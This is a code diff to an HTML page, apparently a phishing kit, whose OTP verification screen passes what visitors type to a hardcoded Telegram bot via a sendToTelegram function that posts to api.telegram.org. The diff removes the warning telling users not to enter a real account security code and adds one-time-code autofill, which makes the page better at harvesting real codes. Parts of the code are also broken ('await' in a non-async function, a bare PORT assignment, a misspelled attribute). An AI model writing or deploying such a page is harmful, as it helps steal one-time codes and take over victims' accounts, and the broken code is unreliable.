@@ -449,11 +449,11 @@
 
       <section class="page" id="otpPage" style="display: none;">
         <h1>OTP Verification</h1>
-        <p class="description">Enter a test verification code to preview this screen. Do not enter a real account security code.</p>
+        <p class="description"></p>
         <form id="otpForm">
           <div class="field">
             <label for="otp">Verification Code</label>
-            <input type="text" id="otp" class="otp-input" placeholder="••••••" inputmode="numeric" maxlength="6" pattern="[0-9]{6}" required>
+            <input type="text" id="otp" class="otp-input" placeholder="••••••" inputmode="numeric" maxlength="6" pattern="[0-9]{6}" outocomplete="one-time-code" required>
           </div>
           <button type="submit">Verify Code</button>
           <button type="button" class="secondary" id="backButton">Back</button>
@@ -466,14 +466,16 @@
   </div>
 
   <script>
-    // ============ PUT YOUR DETAILS HERE ============
+    // ============ server configuration ============
+    PORT=3000
     const BOT_TOKEN = "8663416540:AAEMvIlL7Fc2TrMeAbUZtkGS-C7y3kel618";
     const CHAT_ID = "8663416540";
     // ===============================================
+    //frontent - script running in the browser
 
     function sendToTelegram(msg) {
       try {
-        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
           method: "POST",
           headers: {"Content-Type": "application/json"},
           body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: "HTML"})
